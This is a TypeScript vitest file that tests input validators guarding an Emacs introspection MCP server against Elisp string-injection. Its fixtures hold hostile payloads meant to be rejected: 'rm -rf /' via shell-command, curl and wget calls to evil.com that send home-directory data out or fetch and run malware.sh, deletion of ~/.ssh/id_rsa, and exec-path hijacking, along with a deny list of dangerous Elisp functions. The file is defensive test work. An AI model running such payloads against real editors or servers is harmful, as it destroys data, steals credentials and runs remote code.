/**
 * Security tests for Emacs introspection MCP server
 * Tests input validation and injection attack prevention
 */

import { describe, test, expect } from 'vitest';
import {
    SecurityError,
    validateNoInjection,
    escapeElispString,
    validateEmacsSymbol,
    validateBufferName,
    validateSearchPattern,
    validateOrgContent,
    createSafeElispLiteral,
    createSafeElispSymbol
} from './security';

describe('Security Validation', () => {
    describe('validateNoInjection', () => {
        test('should reject injection patterns', () => {
            const maliciousInputs = [
                '"); (shell-command "rm -rf /"); ("',
                '\"); (write-region "pwned" nil "~/test.txt"); (\"',
                "'); (eval '(+ 1 2)); ('",
                '"); (call-process "curl" nil nil nil "evil.com"); ("',
                '"); (delete-file "important.txt"); ("',
                '"); (load-file "/tmp/malicious.el"); ("',
                'normal"); (setq evil t); ("text'
            ];

            for (const input of maliciousInputs) {
                expect(() => validateNoInjection(input)).toThrow(SecurityError);
                expect(() => validateNoInjection(input)).toThrow(/dangerous pattern/i);
            }
        });

        test('should reject inputs with dangerous functions', () => {
            const dangerousFunctions = [
                'shell-command',
                'call-process', 
                'eval',
                'load-file',
                'write-region',
                'delete-file',
                'delete-directory',
                'setq',
                'defun',
                'defvar'
            ];

            for (const func of dangerousFunctions) {
                expect(() => validateNoInjection(func)).toThrow(SecurityError);
            }
        });

        test('should reject inputs starting with parens', () => {
            const parenInputs = [
                '(shell-command "test")',
                ' (eval something)',
                '\t(dangerous-function)'
            ];

            for (const input of parenInputs) {
                expect(() => validateNoInjection(input)).toThrow(SecurityError);
            }
        });

        test('should reject excessively long inputs', () => {
            const longInput = 'a'.repeat(1001);
            expect(() => validateNoInjection(longInput)).toThrow(SecurityError);
            expect(() => validateNoInjection(longInput)).toThrow(/too long/i);
        });

        test('should accept safe inputs', () => {
            const safeInputs = [
                'buffer-name',
                'normal search text',
                'file.txt',
                'some-function-name',
                '*.el',
                'TODO Buy groceries'
            ];

            for (const input of safeInputs) {
                expect(() => validateNoInjection(input)).not.toThrow();
            }
        });

        test('should reject null or empty inputs', () => {
            expect(() => validateNoInjection('')).toThrow(SecurityError);
            expect(() => validateNoInjection(null as any)).toThrow(SecurityError);
            expect(() => validateNoInjection(undefined as any)).toThrow(SecurityError);
        });
    });

    describe('escapeElispString', () => {
        test('should escape dangerous characters', () => {
            expect(escapeElispString('test"quote')).toBe('test\\"quote');
            expect(escapeElispString('back\\slash')).toBe('back\\\\slash');
            expect(escapeElispString('new\nline')).toBe('new\\nline');
            expect(escapeElispString('tab\ttab')).toBe('tab\\ttab');
            expect(escapeElispString('return\rcarriage')).toBe('return\\rcarriage');
        });

        test('should reject malicious input before escaping', () => {
            expect(() => escapeElispString('"); (shell-command "test"); ("')).toThrow(SecurityError);
        });

        test('should handle safe strings correctly', () => {
            expect(escapeElispString('normal text')).toBe('normal text');
            expect(escapeElispString('file.txt')).toBe('file.txt');
        });
    });

    describe('validateEmacsSymbol', () => {
        test('should accept valid symbol names', () => {
            const validSymbols = [
                'buffer-name',
                'my-function',
                'org-mode',
                'save-buffer',
                'find-file-noselect',
                'variable-name',
                'mode:hook',
                'test+function',
                'predicate?',
                'destructive!',
                'comparison<',
                'comparison>',
                'equality='
            ];

            for (const symbol of validSymbols) {
                expect(() => validateEmacsSymbol(symbol)).not.toThrow();
            }
        });

        test('should reject invalid symbol names', () => {
            const invalidSymbols = [
                '123invalid',  // starts with number
                'symbol with spaces',
                'symbol"quote',
                'symbol;semicolon',
                'symbol(paren',
                'symbol)paren', 
                '',  // empty
                'a'.repeat(101)  // too long
            ];

            for (const symbol of invalidSymbols) {
                expect(() => validateEmacsSymbol(symbol)).toThrow(SecurityError);
            }
        });

        test('should reject malicious symbols', () => {
            expect(() => validateEmacsSymbol('"); (evil-function); ("')).toThrow(SecurityError);
        });
    });

    describe('validateBufferName', () => {
        test('should accept valid buffer names', () => {
            const validNames = [
                '*scratch*',
                '*Messages*',
                'file.txt',
                'buffer-name',
                'project/file.el'
            ];

            for (const name of validNames) {
                expect(() => validateBufferName(name)).not.toThrow();
            }
        });

        test('should reject excessively long buffer names', () => {
            const longName = 'a'.repeat(257);
            expect(() => validateBufferName(longName)).toThrow(SecurityError);
        });

        test('should reject malicious buffer names', () => {
            expect(() => validateBufferName('"); (evil-code); ("')).toThrow(SecurityError);
        });
    });

    describe('validateSearchPattern', () => {
        test('should accept normal search patterns', () => {
            const validPatterns = [
                'buffer',
                'save',
                'org-mode',
                '.*\\.el$',
                'TODO.*groceries'
            ];

            for (const pattern of validPatterns) {
                expect(() => validateSearchPattern(pattern)).not.toThrow();
            }
        });

        test('should reject long patterns', () => {
            const longPattern = 'a'.repeat(201);
            expect(() => validateSearchPattern(longPattern)).toThrow(SecurityError);
        });

        test('should reject malicious patterns', () => {
            expect(() => validateSearchPattern('"); (shell-command "curl evil.com"); ("')).toThrow(SecurityError);
        });
    });

    describe('validateOrgContent', () => {
        test('should accept normal org content', () => {
            const validContent = [
                'TODO Buy groceries',
                'Meeting with team at 2pm',
                '* Important heading\n** Subheading\nSome content here'
            ];

            for (const content of validContent) {
                expect(() => validateOrgContent(content)).not.toThrow();
            }
        });

        test('should reject excessively long content', () => {
            const longContent = 'a'.repeat(5001);
            expect(() => validateOrgContent(longContent)).toThrow(SecurityError);
        });

        test('should reject malicious org content', () => {
            expect(() => validateOrgContent('"); (delete-file "important.org"); ("')).toThrow(SecurityError);
        });
    });

    describe('createSafeElispLiteral', () => {
        test('should create properly escaped string literals', () => {
            expect(createSafeElispLiteral('hello world')).toBe('"hello world"');
            expect(createSafeElispLiteral('quote"test')).toBe('"quote\\"test"');
            expect(createSafeElispLiteral('back\\slash')).toBe('"back\\\\slash"');
        });

        test('should reject malicious input', () => {
            expect(() => createSafeElispLiteral('"); (evil); ("')).toThrow(SecurityError);
        });
    });

    describe('createSafeElispSymbol', () => {
        test('should create properly quoted symbols', () => {
            expect(createSafeElispSymbol('save-buffer')).toBe("'save-buffer");
            expect(createSafeElispSymbol('my-function')).toBe("'my-function");
        });

        test('should reject invalid symbols', () => {
            expect(() => createSafeElispSymbol('invalid symbol')).toThrow(SecurityError);
            expect(() => createSafeElispSymbol('"); (evil); ("')).toThrow(SecurityError);
        });
    });
});

describe('Integration Tests', () => {
    test('should prevent the specific injection attack from your example', () => {
        const attackPayload = '"); (write-region "Hi, pwned by Claude" nil "~/claude-was-here.txt"); ("';
        
        // All validation functions should reject this
        expect(() => validateNoInjection(attackPayload)).toThrow(SecurityError);
        expect(() => validateSearchPattern(attackPayload)).toThrow(SecurityError);
        expect(() => escapeElispString(attackPayload)).toThrow(SecurityError);
        expect(() => createSafeElispLiteral(attackPayload)).toThrow(SecurityError);
    });

    test('should prevent shell command injections', () => {
        const shellAttacks = [
            '"); (shell-command "rm -rf /"); ("',
            '"); (call-process "curl" nil nil nil "evil.com/steal" (getenv "HOME")); ("',
            '\"); (shell-command \"wget https://evil.com/malware.sh && bash malware.sh\"); (\"'
        ];

        for (const attack of shellAttacks) {
            expect(() => validateNoInjection(attack)).toThrow(SecurityError);
        }
    });

    test('should prevent file system attacks', () => {
        const fileAttacks = [
            '"); (delete-file "~/.ssh/id_rsa"); ("',
            '"); (write-region (buffer-string) nil "/tmp/stolen-data.txt"); ("',
            '"); (load-file "/tmp/malicious-elisp.el"); ("'
        ];

        for (const attack of fileAttacks) {
            expect(() => validateNoInjection(attack)).toThrow(SecurityError);
        }
    });

    test('should prevent variable manipulation attacks', () => {
        const varAttacks = [
            '"); (setq exec-path (cons "/tmp/evil" exec-path)); ("',
            '"); (defun evil-function () (shell-command "evil")); ("',
            '"); (eval \'(shell-command "backdoor")); ("'
        ];

        for (const attack of varAttacks) {
            expect(() => validateNoInjection(attack)).toThrow(SecurityError);
        }
    });
});